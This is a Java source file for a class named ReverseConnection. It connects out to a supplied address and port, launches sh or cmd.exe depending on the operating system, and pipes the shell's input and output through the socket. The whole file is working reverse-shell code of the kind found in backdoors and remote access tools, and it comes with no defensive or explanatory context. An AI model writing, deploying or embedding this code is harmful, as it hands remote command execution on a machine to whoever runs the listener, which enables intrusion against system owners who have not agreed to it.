package server;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;

public class ReverseConnection implements Runnable {

	private final InetAddress source;
	public static final String UNIX_SHELL = "sh";
	public static final String WINDOWS_SHELL = "cmd.exe";
	private static int reversePort;

	public ReverseConnection(InetAddress source, int reversePort) {
		this.source = source;
		this.reversePort = reversePort;
	}

	public void run() {
		// start the reverse connection
		System.out.println("Started a reverse connection to: " + source.toString());
		try {
			Socket s = new Socket(source, reversePort);

			String os = System.getProperty("os.name").toLowerCase();

			String command;
			if (os.startsWith("windows")) {
				// run the windows shell
				command = WINDOWS_SHELL;
			} else {
				// run a unix shell
				command = UNIX_SHELL;
			}
			Process process = Runtime.getRuntime().exec(command);
			// read from process write to socket
			Pipe processInToSocketOut = new Pipe(process.getInputStream(), s.getOutputStream());
			// read from process error write to socket
			Pipe processErrorToSocketOut = new Pipe(process.getErrorStream(), s.getOutputStream());
			// read from socket write to process
			Pipe socketInToProcessOut = new Pipe(s.getInputStream(), process.getOutputStream());

			Thread t = new Thread(socketInToProcessOut);
			t.start();
			Thread t2 = new Thread(processErrorToSocketOut);
			t2.start();
			Thread t3 = new Thread(processInToSocketOut);
			t3.start();

			t.join();
			t2.join();
			t3.join();

			process.waitFor();

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} finally {
			System.out.println("Reverse connection closed.");
		}
	}
}
